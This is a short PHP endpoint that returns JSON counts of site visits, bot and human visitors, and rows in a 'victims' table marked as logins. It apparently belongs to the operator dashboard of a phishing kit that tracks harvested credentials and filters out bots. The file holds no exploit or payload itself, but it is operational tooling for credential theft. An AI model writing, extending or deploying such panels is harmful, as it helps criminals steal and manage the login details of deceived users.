<?php
require '../includes/config.php';

header('Content-Type: application/json');

$total_views = $conn->query("SELECT COUNT(*) FROM visits")->fetch_row()[0];
$total_logins = $conn->query("SELECT COUNT(*) FROM victims WHERE type='login'")->fetch_row()[0];
$total_bots = $conn->query("SELECT COUNT(*) FROM visits WHERE is_bot=1")->fetch_row()[0];
$total_humans = $conn->query("SELECT COUNT(*) FROM visits WHERE is_bot=0")->fetch_row()[0];

echo json_encode([
    'total_views' => (int)$total_views,
    'total_logins' => (int)$total_logins,
    'total_bots' => (int)$total_bots,
    'total_humans' => (int)$total_humans
]);
?>
